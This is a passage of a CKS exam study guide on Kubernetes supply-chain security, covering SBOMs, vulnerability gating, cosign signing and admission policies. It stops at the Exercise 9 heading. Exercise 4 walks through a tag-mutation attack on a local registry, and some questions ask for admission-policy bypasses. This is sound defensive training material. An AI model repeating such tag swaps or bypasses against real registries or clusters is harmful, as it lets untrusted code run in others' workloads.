# CKS 4.2 — Understand Your Supply Chain (SBOM, CI/CD, Artifact Repositories)

**Exam:** CKS v1.34 · **Domain:** Supply Chain Security (20%) · **Topic weight:** 5

---

## Scope and mental model

A Kubernetes supply chain is the chain of custody between *a line of source code* and *a process running in a container with your cluster's ServiceAccount token mounted*. Every hop in that chain is a place where an attacker can inject code without touching your cluster:

```text
  source          build            artifact             admission          runtime
  ------          -----            --------             ---------          -------
  git repo  -->   CI runner  -->   registry (OCI)  -->  kube-apiserver --> kubelet
     |               |                  |                     |               |
  commit          builder            tag is             does this image   was the layer
  signing?        identity?          MUTABLE            match policy?     pulled or reused
  branch          secrets            digest is          signature?        from node cache?
  protection      exfil?             immutable          registry allow?
```

The four artifacts you will manipulate in these exercises:

| Artifact | Format | Answers the question |
|---|---|---|
| **SBOM** | SPDX / CycloneDX | *What is inside this image?* |
| **Vulnerability report** | Grype/Trivy JSON, SARIF | *Which of those things is known-bad today?* |
| **Provenance / attestation** | in-toto, SLSA, DSSE envelope | *Who built it, from what source, on what machine?* |
| **Signature** | cosign `.sig` in registry | *Is this the artifact that entity actually approved?* |

An SBOM alone proves nothing — it is an unsigned text file. The security property only appears when the SBOM is **bound to an image digest** and **signed**, and when the cluster **refuses** images that lack that binding.

---

## Prerequisites

A single-node or kubeadm cluster where you have **root on the control plane node** (you will edit static pod manifests), plus these CLI tools.

```bash
# 1. Verify you can reach the cluster and are cluster-admin.
kubectl version -o yaml | grep -E 'gitVersion'
kubectl auth can-i '*' '*' --all-namespaces

# 2. Install the supply-chain toolbelt (Linux amd64).
curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh  | sh -s -- -b /usr/local/bin
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin
curl -sSfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin
curl -sSfLO https://github.com/sigstore/cosign/releases/latest/download/cosign-linux-amd64
install -m 0755 cosign-linux-amd64 /usr/local/bin/cosign
go install github.com/google/go-containerregistry/cmd/crane@latest 2>/dev/null || \
  curl -sSfL https://github.com/google/go-containerregistry/releases/latest/download/go-containerregistry_Linux_x86_64.tar.gz | tar -xz -C /usr/local/bin crane

# 3. Confirm.
syft version; grype version; trivy --version; cosign version; crane version
```

```bash
# 4. A local registry to push to, so the exercises do not depend on Docker Hub rate limits.
docker run -d --restart=always -p 5000:5000 --name registry registry:2
export REG=localhost:5000
crane catalog $REG    # empty on a fresh registry, exits 0
```

> **Exam note.** In the exam you will *not* install tooling. `syft`, `grype`, `trivy`, `cosign` and `crane` may or may not be present; what is always present is `kubectl`, `crictl`, `docker`/`podman`, and the API server manifest at `/etc/kubernetes/manifests/kube-apiserver.yaml`. Exercises 6, 7 and 10 are the ones that map directly onto exam tasks.

---

## Exercise 1 — Measure and shrink the attack surface of an image

**Objective:** understand *why* image minimization is a supply-chain control, not a performance optimization, and quantify it.

1. Write a deliberately naive application and Dockerfile.

```bash
mkdir -p ~/sc-lab/app && cd ~/sc-lab/app
cat > main.go <<'EOF'
package main

import (
	"fmt"
	"net/http"
)

func main() {
	http.HandleFunc("/healthz", func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprintln(w, "ok")
	})
	http.ListenAndServe(":8080", nil)
}
EOF
cat > go.mod <<'EOF'
module example.com/healthz

go 1.22
EOF
```

2. Build the "fat" variant — the shape most real pipelines start with.

```bash
cat > Dockerfile.fat <<'EOF'
FROM golang:1.22
WORKDIR /src
COPY . .
RUN go build -o /healthz ./main.go
EXPOSE 8080
CMD ["/healthz"]
EOF

docker build -f Dockerfile.fat -t $REG/healthz:fat .
```

3. Build the minimized variant: multi-stage, static binary, distroless base, non-root, no shell.

```bash
cat > Dockerfile.slim <<'EOF'
# ---- build stage: never shipped ----
FROM golang:1.22 AS build
WORKDIR /src
COPY go.mod ./
COPY main.go ./
# CGO_ENABLED=0 removes the dynamic link against glibc, so the runtime
# layer needs no libc at all.
RUN CGO_ENABLED=0 GOFLAGS=-trimpath go build -ldflags="-s -w" -o /healthz ./main.go

# ---- runtime stage: pinned by digest, not by tag ----
FROM gcr.io/distroless/static-debian12:nonroot
COPY --from=build /healthz /healthz
USER 65532:65532
EXPOSE 8080
ENTRYPOINT ["/healthz"]
EOF

docker build -f Dockerfile.slim -t $REG/healthz:slim .
```

4. Compare size and layer count.

```bash
docker images --format 'table {{.Repository}}:{{.Tag}}\t{{.Size}}' | grep healthz
```

```text
REPOSITORY:TAG                 SIZE
localhost:5000/healthz:fat     1.24GB
localhost:5000/healthz:slim    6.61MB
```

5. Compare the *package* count — the number of things that can receive a CVE.

```bash
syft scan docker:$REG/healthz:fat  -o table | tail -n 3
syft scan docker:$REG/healthz:slim -o table
```

```text
# fat  (abridged) …
[1194 packages]

# slim
NAME                 VERSION   TYPE
healthz              (devel)   go-module
stdlib               go1.22.5  go-module
base-files           12.4      deb
netbase              6.4       deb
tzdata               2024a-3   deb
```

6. Prove that the minimized image has no interactive foothold.

```bash
docker run --rm -it --entrypoint sh  $REG/healthz:slim || echo "no shell -> exit $?"
docker run --rm -it --entrypoint /bin/ls $REG/healthz:slim || echo "no coreutils"
```

7. Push both, so later exercises have something to work on.

```bash
docker push $REG/healthz:fat
docker push $REG/healthz:slim
```

### Verification questions — block 1

- **Q1.1** The `fat` image contains the Go toolchain, `git`, `apt` and a full shell. Name three *distinct* post-exploitation capabilities that gives an attacker who achieves RCE inside the container, that the `slim` image denies.
- **Q1.2** Why does `CGO_ENABLED=0` matter for the choice of `distroless/static` versus `distroless/base`?
- **Q1.3** A colleague argues distroless is "security theatre" because an attacker can upload their own busybox over the network. Give the strongest counter-argument, and then state the one Kubernetes-level control that makes that objection genuinely weak.
- **Q1.4** The build stage image `golang:1.22` had 1194 packages, several with critical CVEs. Do those CVEs appear in the SBOM of the `slim` image? Do they matter at all?

---

## Exercise 2 — Generate an SBOM in both standard formats

**Objective:** produce SPDX and CycloneDX documents, and read the fields that actually carry security meaning.

1. Resolve the tag to an immutable digest **first**. Every artifact you produce from now on refers to the digest, never the tag.

```bash
export IMG_TAG=$REG/healthz:slim
export IMG_DIGEST=$(crane digest $IMG_TAG)
export IMG=$REG/healthz@$IMG_DIGEST
echo "$IMG"
```

```text
localhost:5000/healthz@sha256:4d1e2b7c9a0f5e3b8c6d4a2f1e0b9c8d7a6f5e4d3c2b1a09f8e7d6c5b4a39281
```

2. Generate an SPDX 2.3 JSON SBOM with syft.

```bash
syft scan registry:$IMG -o spdx-json=sbom.spdx.json
jq '{spdxVersion, name, creationInfo: .creationInfo.creators, packages: (.packages|length)}' sbom.spdx.json
```

```text
{
  "spdxVersion": "SPDX-2.3",
  "name": "localhost:5000/healthz@sha256:4d1e2b7c...",
  "creationInfo": [ "Organization: Anchore, Inc", "Tool: syft-1.x.x" ],
  "packages": 5
}
```

3. Generate a CycloneDX 1.6 SBOM, and inspect the **subject binding** — the field that ties the document to one specific image.

```bash
syft scan registry:$IMG -o cyclonedx-json=sbom.cdx.json
jq '.metadata.component | {type, name, version}' sbom.cdx.json
jq '.metadata.component.hashes' sbom.cdx.json
```

4. Generate the same thing with Trivy, and diff the inventories. Two scanners disagreeing is normal and is itself a lesson.

```bash
trivy image --format cyclonedx --output trivy.cdx.json $IMG
jq -r '.components[]? | "\(.name)@\(.version)"' sbom.cdx.json  | sort > /tmp/syft.txt
jq -r '.components[]? | "\(.name)@\(.version)"' trivy.cdx.json | sort > /tmp/trivy.txt
diff /tmp/syft.txt /tmp/trivy.txt || true
```

5. Look at what an SBOM records for a *file* that no package manager installed.

```bash
# Inject a vendored binary with no package metadata.
cat > Dockerfile.blind <<'EOF'
FROM gcr.io/distroless/static-debian12:nonroot
COPY --from=busybox:1.36 /bin/busybox /opt/vendor/busybox
COPY --from=build /healthz /healthz
ENTRYPOINT ["/healthz"]
EOF
docker build -f Dockerfile.slim -t healthz-build --target build .
docker build -f Dockerfile.blind -t $REG/healthz:blind --build-context build=docker-image://healthz-build . 2>/dev/null \
  || echo "if buildx contexts are unavailable, copy busybox in manually and rebuild"

syft scan docker:$REG/healthz:blind -o table | grep -i busybox || echo "busybox NOT catalogued"
```

6. Enable the file-level catalogers and re-scan.

```bash
syft scan docker:$REG/healthz:blind \
  --select-catalogers '+binary-classifier-cataloger' -o table | grep -i busybox
```

```text
busybox   1.36.1   binary
```

### Verification questions — block 2

- **Q2.1** What is the single most important field in an SBOM from a *verification* standpoint, and what happens to the document's value if it is missing?
- **Q2.2** Syft and Trivy produced different component lists for the same digest. Which one is "right", and what does the disagreement tell you about consuming SBOMs as a policy input?
- **Q2.3** The default scan missed the vendored `busybox`. Describe the class of supply-chain attack that this blind spot enables, and two ways a pipeline can close it.
- **Q2.4** You generated the SBOM from `registry:$IMG` rather than `docker:$REG/healthz:slim`. Give a security reason to prefer the registry source over the local daemon source in CI.
- **Q2.5** SPDX or CycloneDX — which would you pick for a pipeline whose main goal is license compliance, and which for one whose main goal is VEX-driven vulnerability triage? Justify briefly.

---

## Exercise 3 — Consume the SBOM: scanning, gating, and VEX

**Objective:** turn the inventory into a build-breaking decision, and learn why a raw CVE count is a bad gate.

1. Scan the *SBOM file*, not the image. This is what a policy service does — it never needs registry access.

```bash
grype sbom:./sbom.spdx.json -o table
```

```text
NAME     INSTALLED  FIXED-IN  TYPE       VULNERABILITY   SEVERITY
stdlib   go1.22.5   1.22.7    go-module  GHSA-xxxx-xxxx  High
```

2. Now scan the fat image for contrast, and make the run *fail* on severity.

```bash
syft scan docker:$REG/healthz:fat -o spdx-json=fat.spdx.json
grype sbom:./fat.spdx.json --fail-on critical -q -o table | head -n 15; echo "exit=$?"
```

3. Restrict the gate to what is actionable — vulnerabilities with a fix available.

```bash
grype sbom:./fat.spdx.json --only-fixed --fail-on high -o table | wc -l
```

4. Do the same with Trivy, both from the SBOM and directly, and emit SARIF for the CI UI.

```bash
trivy sbom sbom.cdx.json --severity HIGH,CRITICAL --exit-code 1
trivy image --scanners vuln,secret,misconfig --severity HIGH,CRITICAL \
             --format sarif --output trivy.sarif $IMG
jq -r '.runs[0].results | length' trivy.sarif
```

5. Suppress a vulnerability you have analysed as not-exploitable, using OpenVEX rather than a blanket ignore.

```bash
cat > vex.json <<'EOF'
{
  "@context": "https://openvex.dev/ns/v0.2.0",
  "@id": "https://example.com/vex/healthz-2026-08-03",
  "author": "platform-security@example.com",
  "timestamp": "2026-08-03T10:00:00Z",
  "version": 1,
  "statements": [
    {
      "vulnerability": { "name": "CVE-2024-24790" },
      "products": [
        { "@id": "pkg:oci/healthz@sha256%3A4d1e2b7c9a0f5e3b8c6d4a2f1e0b9c8d7a6f5e4d3c2b1a09f8e7d6c5b4a39281" }
      ],
      "status": "not_affected",
      "justification": "vulnerable_code_not_in_execute_path"
    }
  ]
}
EOF

trivy image --vex vex.json --severity HIGH,CRITICAL $IMG
```

6. Compare against the alternative that teams reach for under deadline pressure.

```bash
cat > .trivyignore <<'EOF'
CVE-2024-24790
EOF
trivy image --severity HIGH,CRITICAL $IMG
```

### Verification questions — block 3

- **Q3.1** `grype sbom:./sbom.spdx.json` and `grype registry:$IMG` can return different results for the same image on the same day. Give two independent reasons.
- **Q3.2** A pipeline gate is defined as "fail if any CRITICAL exists". Explain why this gate reliably degrades into a rubber stamp, and propose a gate definition that does not.
- **Q3.3** What does `.trivyignore` assert, and what does the OpenVEX `not_affected` / `vulnerable_code_not_in_execute_path` statement assert? Why does the difference matter to an auditor?
- **Q3.4** Your SBOM was generated at build time in January. In August, a new CVE is published against a package listed in it. Does the SBOM need regenerating? What *does* need re-running, and where should it run?

---

## Exercise 4 — Tags are mutable; digests are not

**Objective:** reproduce a tag-mutation attack against a live workload and detect it from inside the cluster.

1. Deploy a workload that references a **tag**.

```bash
kubectl create ns supply
cat > tagged.yaml <<'EOF'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: healthz
  namespace: supply
spec:
  replicas: 1
  selector:
    matchLabels: { app: healthz }
  template:
    metadata:
      labels: { app: healthz }
    spec:
      containers:
      - name: app
        image: localhost:5000/healthz:slim
        imagePullPolicy: Always
        ports:
        - containerPort: 8080
EOF
kubectl apply -f tagged.yaml
kubectl -n supply rollout status deploy/healthz
```

2. Record what is actually running. Note the distinction between `spec…image` (what you asked for) and `status…imageID` (what the kubelet resolved).

```bash
kubectl -n supply get pods -o custom-columns=\
'POD:.metadata.name,SPEC:.spec.containers[*].image,RESOLVED:.status.containerStatuses[*].imageID'
```

```text
POD                       SPEC                            RESOLVED
healthz-7c9d5f8b6-2xk4q   localhost:5000/healthz:slim     localhost:5000/healthz@sha256:4d1e2b7c...
```

3. Mutate the tag. This is exactly what an attacker with registry write access — or a compromised CI job — does.

```bash
crane copy $REG/healthz:fat $REG/healthz:slim     # the tag now points somewhere else
crane digest $REG/healthz:slim                   # different from $IMG_DIGEST
```

4. Trigger a benign-looking event: a node reboot, an eviction, an HPA scale-up. Simulate with a rollout restart.

```bash
kubectl -n supply rollout restart deploy/healthz
kubectl -n supply rollout status deploy/healthz
kubectl -n supply get pods -o custom-columns=\
'POD:.metadata.name,SPEC:.spec.containers[*].image,RESOLVED:.status.containerStatuses[*].imageID'
```

```text
POD                       SPEC                            RESOLVED
healthz-6b4f9c7d5-p8m2r   localhost:5000/healthz:slim     localhost:5000/healthz@sha256:9f3c1a...
```

Nothing in the Deployment changed. The running code did.

5. Write the cluster-wide drift detector — the query that finds every workload whose declared image is not digest-pinned.

```bash
kubectl get pods -A -o json | jq -r '
  .items[] |
  . as $p |
  ($p.spec.containers + ($p.spec.initContainers // []))[] |
  select(.image | contains("@sha256:") | not) |
  "\($p.metadata.namespace)/\($p.metadata.name)\t\(.image)"
' | sort -u | head
```

6. Repair the Deployment by pinning to a digest.

```bash
kubectl -n supply set image deploy/healthz app=$REG/healthz@$IMG_DIGEST
kubectl -n supply get deploy healthz -o jsonpath='{.spec.template.spec.containers[0].image}{"\n"}'
```

### Verification questions — block 4

- **Q4.1** In step 4, the Deployment's `spec` was byte-identical before and after, yet different code ran. Which Kubernetes field would have revealed the change, and why is `spec.containers[].image` insufficient for audit?
- **Q4.2** With `imagePullPolicy: IfNotPresent` and a mutated tag, what determines whether a given node runs the old or the new code? What is the security consequence of that non-determinism?
- **Q4.3** A pod is scheduled onto a node that already has a private image in its local cache. The pod's namespace has no `imagePullSecret` for that registry. Does the container start? Which admission plugin changes the answer, and how?
- **Q4.4** Digest pinning makes rollouts immune to tag mutation but introduces an operational cost. What is it, and what pipeline component normally absorbs it?

---

## Exercise 5 — Sign the image and attach the SBOM as an attestation

**Objective:** bind the SBOM to the digest cryptographically, so the cluster can verify a claim rather than trust a file.

1. Generate a key pair. In CI you would use keyless/OIDC instead — step 6.

```bash
cd ~/sc-lab/app
COSIGN_PASSWORD="" cosign generate-key-pair
ls cosign.key cosign.pub
```

2. Sign the **digest**, never the tag.

```bash
COSIGN_PASSWORD="" cosign sign --key cosign.key --tlog-upload=false --yes $IMG
```

3. Observe where the signature physically lives: it is an ordinary OCI artifact in the same repository.

```bash
cosign triangulate $IMG
crane ls $REG/healthz
```

```text
localhost:5000/healthz:sha256-4d1e2b7c9a0f5e3b8c6d4a2f1e0b9c8d7a6f5e4d3c2b1a09f8e7d6c5b4a39281.sig
fat
slim
sha256-4d1e2b7c....sig
```

4. Verify, and read the payload.

```bash
cosign verify --key cosign.pub --insecure-ignore-tlog=true $IMG | jq '.[0].critical'
```

```text
{
  "identity": { "docker-reference": "localhost:5000/healthz" },
  "image": { "docker-manifest-digest": "sha256:4d1e2b7c..." },
  "type": "cosign container image signature"
}
```

5. Attach the SBOM as a signed in-toto attestation, then verify it and extract the predicate back out.

```bash
COSIGN_PASSWORD="" cosign attest --key cosign.key --tlog-upload=false --yes \
  --predicate sbom.spdx.json --type spdxjson $IMG

cosign verify-attestation --key cosign.pub --insecure-ignore-tlog=true \
  --type spdxjson $IMG \
  | jq -r '.payload' | base64 -d | jq '{_type, predicateType, subject: .subject[0].digest}'
```

```text
{
  "_type": "https://in-toto.io/Statement/v0.1",
  "predicateType": "https://spdx.dev/Document",
  "subject": { "sha256": "4d1e2b7c9a0f5e3b8c6d4a2f1e0b9c8d7a6f5e4d3c2b1a09f8e7d6c5b4a39281" }
}
```

6. Prove the binding is tamper-evident: attest a *different* image with the *same* SBOM and watch the subject mismatch.

```bash
FAT=$REG/healthz@$(crane digest $REG/healthz:fat)
cosign verify-attestation --key cosign.pub --insecure-ignore-tlog=true --type spdxjson $FAT
```

```text
Error: no matching attestations: ...
```

7. Inspect what keyless signing produces, conceptually — the identity replaces the key.

```bash
# In a GitHub Actions job with `id-token: write`, this needs no secret at all:
#   cosign sign --yes $IMG
# and verification pins the *workflow identity*, not a public key:
cat <<'EOF'
cosign verify \
  --certificate-identity-regexp '^https://github.com/acme/healthz/\.github/workflows/release\.yaml@refs/tags/v.*$' \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  ghcr.io/acme/healthz@sha256:...
EOF
```

8. Add build provenance with buildx, so the image carries "who built me, from which commit".

```bash
docker buildx build -f Dockerfile.slim \
  --provenance=mode=max --sbom=true \
  -t $REG/healthz:attested --push .
crane manifest $REG/healthz:attested | jq '.manifests[] | {mediaType, "predicate": .annotations["vnd.docker.reference.type"]}'
```

### Verification questions — block 5

- **Q5.1** `cosign sign` did not modify the image. Where is the signature stored, and what does that imply if you `crane copy` the image to another registry with a plain copy?
- **Q5.2** Explain the trust difference between key-based signing and keyless signing. Which one is harder for an attacker who steals a CI runner's disk, and why?
- **Q5.3** In step 6, verification failed. Which field in the in-toto statement made that failure possible, and what attack does it prevent?
- **Q5.4** `--insecure-ignore-tlog=true` was used throughout. What is the transparency log (Rekor) actually protecting against, and what capability do you lose by disabling it?
- **Q5.5** A verified signature says "the holder of this key approved this digest". List two important supply-chain questions a valid signature does **not** answer.

---

## Exercise 6 — Enforce policy in-cluster with `ImagePolicyWebhook`

**Objective:** configure the API server admission plugin that the CKS exam is most likely to ask for. Take a **snapshot/backup of the manifest before you start** — a mistake here stops the API server.

1. Back up the API server manifest and prepare the config directory.

```bash
sudo cp /etc/kubernetes/manifests/kube-apiserver.yaml /root/kube-apiserver.yaml.bak
sudo mkdir -p /etc/kubernetes/admission
```

2. Write the `AdmissionConfiguration` that points the plugin at a backend.

```bash
sudo tee /etc/kubernetes/admission/admission-config.yaml >/dev/null <<'EOF'
apiVersion: apiserver.config.k8s.io/v1
kind: AdmissionConfiguration
plugins:
- name: ImagePolicyWebhook
  configuration:
    imagePolicy:
      kubeConfigFile: /etc/kubernetes/admission/imagepolicy-kubeconfig.yaml
      # Cache TTLs, in seconds.
      allowTTL: 50
      denyTTL: 50
      retryBackoff: 500
      # false == fail CLOSED. If the backend is unreachable, DENY.
      defaultAllow: false
EOF
```

3. Write the kubeconfig the API server uses to *call* the webhook. Note this is the API server acting as a client, with its own client certificate.

```bash
sudo tee /etc/kubernetes/admission/imagepolicy-kubeconfig.yaml >/dev/null <<'EOF'
apiVersion: v1
kind: Config
clusters:
- name: image-checker
  cluster:
    certificate-authority: /etc/kubernetes/admission/webhook-ca.crt
    server: https://image-checker.supply-chain.svc:443/check
contexts:
- name: image-checker
  context:
    cluster: image-checker
    user: api-server
current-context: image-checker
preferences: {}
users:
- name: api-server
  user:
    client-certificate: /etc/kubernetes/admission/apiserver-client.crt
    client-key: /etc/kubernetes/admission/apiserver-client.key
EOF
```

4. Edit the static pod manifest. Three separate changes are required — missing any one is the classic failure.

```bash
sudo vi /etc/kubernetes/manifests/kube-apiserver.yaml
```

```yaml
spec:
  containers:
  - command:
    - kube-apiserver
    # (a) enable the plugin — keep the plugins that were already there
    - --enable-admission-plugins=NodeRestriction,ImagePolicyWebhook
    # (b) point it at the config
    - --admission-control-config-file=/etc/kubernetes/admission/admission-config.yaml
    volumeMounts:
    # (c) the config must be visible INSIDE the static pod
    - name: admission-config
      mountPath: /etc/kubernetes/admission
      readOnly: true
  volumes:
  - name: admission-config
    hostPath:
      path: /etc/kubernetes/admission
      type: DirectoryOrCreate
```

5. Wait for the kubelet to restart the static pod and confirm the flags took effect.

```bash
until kubectl get --raw /healthz >/dev/null 2>&1; do echo waiting; sleep 3; done
kubectl -n kube-system get pod -l component=kube-apiserver \
  -o jsonpath='{.items[0].spec.containers[0].command}' | tr ',' '\n' | grep -E 'admission'
```

6. Observe fail-closed behaviour with no backend deployed.

```bash
kubectl -n supply run probe --image=$REG/healthz:slim --restart=Never
```

```text
Error from server (Forbidden): pods "probe" is forbidden: Post "https://image-checker.supply-chain.svc:443/check": dial tcp: lookup image-checker.supply-chain.svc: no such host
```

7. Understand the wire contract. This is what the API server POSTs and what your backend must answer.

```json
{
  "apiVersion": "imagepolicy.k8s.io/v1alpha1",
  "kind": "ImageReview",
  "spec": {
    "containers": [ { "image": "localhost:5000/healthz:slim" } ],
    "annotations": { "policy.image-policy.k8s.io/break-glass": "INC-4417" },
    "namespace": "supply"
  }
}
```

```json
{
  "apiVersion": "imagepolicy.k8s.io/v1alpha1",
  "kind": "ImageReview",
  "status": { "allowed": false, "reason": "image is not digest-pinned" }
}
```

8. Restore the cluster to a working state before continuing.

```bash
sudo cp /root/kube-apiserver.yaml.bak /etc/kubernetes/manifests/kube-apiserver.yaml
until kubectl get --raw /healthz >/dev/null 2>&1; do sleep 3; done
kubectl get --raw /healthz
```

### Verification questions — block 6

- **Q6.1** You set `--enable-admission-plugins` and `--admission-control-config-file` correctly, restarted, and the API server comes up but the webhook is never called. What is the most likely cause, and how do you confirm it in ten seconds?
- **Q6.2** `defaultAllow: false` blocked a pod. In a production cluster, describe the concrete failure sequence that turns this setting into a cluster-wide outage, and the mitigation that keeps fail-closed semantics without that risk.
- **Q6.3** The API server container did not come back at all after your edit. Where do you look for the error, given that `kubectl` no longer works?
- **Q6.4** Pod annotations prefixed `*.image-policy.k8s.io/*` are forwarded to the backend. Why is a "break-glass" annotation a privilege-escalation risk, and how do you contain it?
- **Q6.5** `ImageReview` is still `v1alpha1`. Give two reasons a production platform would choose a `ValidatingWebhookConfiguration`-based controller instead, and one reason `ImagePolicyWebhook` is still worth knowing.

---

## Exercise 7 — Restrict artifact repositories with `ValidatingAdmissionPolicy`

**Objective:** enforce "only images from approved registries, pinned by digest" with **no external component** — the in-tree, CEL-based mechanism that is GA since 1.30.

1. Write the policy. Cover `initContainers` and `ephemeralContainers`, not just `containers` — this is where most hand-written policies leak.

```bash
cat > vap-registry.yaml <<'EOF'
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicy
metadata:
  name: approved-registries
spec:
  failurePolicy: Fail
  matchConstraints:
    resourceRules:
    - apiGroups:   [""]
      apiVersions: ["v1"]
      operations:  ["CREATE", "UPDATE"]
      resources:   ["pods"]
  variables:
  - name: allowedPrefixes
    expression: "['registry.internal.example.com/', 'localhost:5000/']"
  - name: allImages
    expression: >-
      object.spec.containers.map(c, c.image) +
      (has(object.spec.initContainers) ? object.spec.initContainers.map(c, c.image) : []) +
      (has(object.spec.ephemeralContainers) ? object.spec.ephemeralContainers.map(c, c.image) : [])
  validations:
  - expression: >-
      variables.allImages.all(i,
        variables.allowedPrefixes.exists(p, i.startsWith(p)))
    messageExpression: >-
      'image from an unapproved registry; allowed prefixes: ' +
      variables.allowedPrefixes.join(', ')
    reason: Forbidden
  - expression: "variables.allImages.all(i, i.contains('@sha256:'))"
    message: "every image must be pinned by digest (image@sha256:...)"
    reason: Forbidden
EOF
kubectl apply -f vap-registry.yaml
```

2. Bind it. A policy without a binding is inert — this is the single most common mistake.

```bash
cat > vap-binding.yaml <<'EOF'
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicyBinding
metadata:
  name: approved-registries-binding
spec:
  policyName: approved-registries
  validationActions: ["Deny", "Audit"]
  matchResources:
    namespaceSelector:
      matchExpressions:
      - key: kubernetes.io/metadata.name
        operator: NotIn
        values: ["kube-system", "kube-node-lease"]
EOF
kubectl apply -f vap-binding.yaml
kubectl get validatingadmissionpolicy,validatingadmissionpolicybinding
```

3. Test the deny path — wrong registry.

```bash
kubectl -n supply run bad-reg --image=docker.io/library/nginx:1.27 --restart=Never
```

```text
The pods "bad-reg" is invalid: ValidatingAdmissionPolicy 'approved-registries'
with binding 'approved-registries-binding' denied request:
image from an unapproved registry; allowed prefixes: registry.internal.example.com/, localhost:5000/
```

4. Test the second rule — right registry, unpinned tag.

```bash
kubectl -n supply run bad-tag --image=$REG/healthz:slim --restart=Never
```

```text
... denied request: every image must be pinned by digest (image@sha256:...)
```

5. Test the allow path.

```bash
kubectl -n supply run good --image=$IMG --restart=Never
kubectl -n supply get pod good
```

6. Now observe the *deferred failure* trap: create a Deployment with a bad image and watch where the error surfaces.

```bash
kubectl -n supply create deployment bad-deploy --image=docker.io/library/nginx:1.27
echo "apply exit=$?"
kubectl -n supply get deploy bad-deploy
kubectl -n supply describe rs -l app=bad-deploy | grep -A3 -i events
```

```text
apply exit=0
NAME         READY   UP-TO-DATE   AVAILABLE
bad-deploy   0/1     0            0
Events:
  Warning  FailedCreate  ... Error creating: ... denied request: image from an unapproved registry ...
```

7. Add an audit-only shadow binding, the way you would roll this out to an existing cluster.

```bash
cat > vap-binding-audit.yaml <<'EOF'
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicyBinding
metadata:
  name: approved-registries-audit
spec:
  policyName: approved-registries
  validationActions: ["Audit", "Warn"]
EOF
kubectl apply -f vap-binding-audit.yaml
```

Audit annotations then appear in the API server audit log under `validation.policy.admission.k8s.io/validation_failure`, letting you size the blast radius before flipping to `Deny`.

### Verification questions — block 7

- **Q7.1** `kubectl create deployment` returned exit 0 with a forbidden image. Explain the mechanism, and state what you would add to the policy to make the failure visible at `kubectl apply` time.
- **Q7.2** Your first draft of the policy only inspected `object.spec.containers`. Give the exact one-line pod spec an attacker uses to bypass it, and a second bypass using a subresource.
- **Q7.3** `failurePolicy: Fail` on a `ValidatingAdmissionPolicy` behaves differently from `failurePolicy: Fail` on a `ValidatingWebhookConfiguration` in terms of availability risk. Why?
- **Q7.4** The binding excludes `kube-system`. Argue both sides: why is that exclusion pragmatic, and what does it cost you from a supply-chain standpoint?
- **Q7.5** `validationActions: ["Deny", "Audit"]` — why would you ever want both, given Deny already blocks the request?

---

## Exercise 8 — Enforce signature verification at admission

**Objective:** close the loop — make the cluster refuse any image whose signature and SBOM attestation from Exercise 5 cannot be verified. CEL cannot do cryptography, so this needs a controller.

1. Install Kyverno.

```bash
kubectl create ns kyverno
kubectl apply -f https://github.com/kyverno/kyverno/releases/latest/download/install.yaml
kubectl -n kyverno rollout status deploy/kyverno-admission-controller --timeout=180s
```

2. Write a policy that verifies the cosign signature **and** rewrites the tag to the resolved digest at admission time.

```bash
cat > kyverno-verify.yaml <<EOF
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-image-signature
spec:
  validationFailureAction: Enforce
  background: false
  webhookTimeoutSeconds: 30
  rules:
  - name: check-signature
    match:
      any:
      - resources:
          kinds: ["Pod"]
          namespaces: ["supply"]
    verifyImages:
    - imageReferences:
      - "localhost:5000/healthz*"
      # Resolve the tag to a digest and REWRITE the pod spec.
      mutateDigest: true
      # Refuse to admit anything that is not verifiable.
      required: true
      verifyDigest: true
      attestors:
      - count: 1
        entries:
        - keys:
            publicKeys: |-
$(sed 's/^/              /' cosign.pub)
            rekor:
              ignoreTlog: true
EOF
kubectl apply -f kyverno-verify.yaml
```

3. Test with the signed image.

```bash
kubectl -n supply run signed --image=$REG/healthz:slim --restart=Never
kubectl -n supply get pod signed -o jsonpath='{.spec.containers[0].image}{"\n"}'
```

```text
localhost:5000/healthz@sha256:4d1e2b7c9a0f5e3b8c6d4a2f1e0b9c8d7a6f5e4d3c2b1a09f8e7d6c5b4a39281
```

The tag you typed was replaced by the digest Kyverno verified. That mutation is the point.

4. Test with the unsigned image.

```bash
kubectl -n supply run unsigned --image=$REG/healthz:fat --restart=Never
```

```text
Error from server: admission webhook "mutate.kyverno.svc-fail" denied the request:
resource Pod/supply/unsigned was blocked due to the following policies

verify-image-signature:
  check-signature: 'failed to verify image localhost:5000/healthz:fat: .attestors[0].entries[0].keys: no matching signatures'
```

5. Extend the policy to require the SBOM attestation and assert a condition *inside* the predicate.

```yaml
    verifyImages:
    - imageReferences: ["localhost:5000/healthz*"]
      mutateDigest: true
      required: true
      attestations:
      - type: https://spdx.dev/Document
        attestors:
        - entries:
          - keys:
              publicKeys: |-
                -----BEGIN PUBLIC KEY-----
                ...
                -----END PUBLIC KEY-----
              rekor:
                ignoreTlog: true
        conditions:
        - all:
          - key: "{{ spdxVersion }}"
            operator: Equals
            value: "SPDX-2.3"
```

6. Confirm the mutation is durable across restarts and that Kyverno's own images are excluded from the policy (otherwise you build a deadlock).

```bash
kubectl -n supply delete pod signed
kubectl -n supply run signed --image=$REG/healthz:slim --restart=Never
kubectl -n supply get pod signed -o jsonpath='{.status.containerStatuses[0].imageID}{"\n"}'
```

### Verification questions — block 8

- **Q8.1** `mutateDigest: true` is a mutating behaviour inside a verification policy. What TOCTOU (time-of-check/time-of-use) gap does it close, and what would go wrong without it?
- **Q8.2** Why can a `ValidatingAdmissionPolicy` (Exercise 7) not replace this policy, even though CEL is expressive?
- **Q8.3** The Kyverno webhook has `failurePolicy: Fail`. Describe the bootstrap deadlock this creates on a cold cluster start, and the two standard mitigations.
- **Q8.4** Your policy matches `localhost:5000/healthz*`. An attacker deploys `localhost:5000/healthzevil:v1`. Is it verified? What does this teach about writing image-reference globs?
- **Q8.5** Signature verification is on. Explain why a signed image can still be malicious, and name the control that addresses that residual risk.

---

## Exercise 9 — Harden the CI/CD stage itself

